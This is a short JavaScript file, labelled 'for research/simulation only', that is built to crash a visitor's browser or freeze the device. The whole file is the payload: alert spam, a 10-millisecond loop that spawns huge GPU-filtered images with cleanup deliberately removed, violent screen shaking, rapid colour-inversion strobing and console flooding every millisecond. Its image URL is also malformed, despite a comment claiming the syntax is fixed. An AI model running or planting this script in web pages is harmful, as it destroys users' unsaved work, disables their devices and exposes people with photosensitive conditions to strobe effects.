/* 
  ⚠️ WARNING: FOR RESEARCH/SIMULATION ONLY ⚠️
  THIS SCRIPT IS DESIGNED TO DELIBERATELY EXHAUST SYSTEM RESOURCES (VRAM/RAM).
  RUNNING THIS MAY CAUSE YOUR BROWSER TO CRASH, YOUR OPERATING SYSTEM TO FREEZE, 
  OR YOUR DEVICE TO REBOOT. ALL UNSAVED DATA WILL BE LOST.
*/

(function() {
    // 1. ALERT SPAM
    for(let i=0; i<3; i++) alert("!!! WARNING: VRAM OVERFLOW !!!");

    // 2. THE "SYSTEM KILLER" SPAWNER
    function spawnMegaImage() {
        const img = new Image();
        // MASSIVE SIZE: 1500px to 3000px per image
        const size = Math.floor(Math.random() * 1500) + 1500; 
        // Fixed URL syntax for stability
        img.src = `https://picsum.photos{size}/${size}?random=${Math.random()}`;
        
        img.style.cssText = `
            position: fixed;
            top: ${Math.random() * 100}vh;
            left: ${Math.random() * 100}vw;
            width: ${size}px;
            z-index: 999999;
            pointer-events: none;
            /* Heavy GPU filters */
            filter: contrast(2) saturate(3) blur(1px) drop-shadow(0 0 50px red);
            transition: transform 3s cubic-bezier(0.1, 0, 0.9, 1);
            transform: translate(-50%, -50%) scale(0.01) rotate(0deg);
        `;

        document.body.appendChild(img);

        // Immediate massive expansion
        requestAnimationFrame(() => {
            img.style.transform = `translate(-50%, -50%) scale(8) rotate(${Math.random() * 5000}deg)`;
            img.style.opacity = '0.8';
        });

        // Removed cleanup (No img.remove) to maximize RAM usage
    }

    // 3. THE HYPER-LOOP (10ms - roughly 100 images per second)
    const chaosInterval = setInterval(() => {
        spawnMegaImage();
        
        // Violent Screen Jitter
        document.body.style.transform = `translate(${(Math.random()-0.5)*300}px, ${(Math.random()-0.5)*300}px) rotate(${(Math.random()-0.5)*10}deg)`;
        
        // Rapid strobe inversion
        document.documentElement.style.filter = `invert(${Math.random() > 0.5 ? 100 : 0}%) hue-rotate(${Math.random() * 360}deg)`;
        
        document.title = "CRASH_LOG_" + Math.random().toString(16).toUpperCase();
    }, 10);

    // 4. CONSOLE FLOODING (Saturates the DevTools process)
    setInterval(() => {
        console.error("FATAL ERROR: MEMORY_BUFFER_EXCEEDED_" + Date.now());
    }, 1);

})();
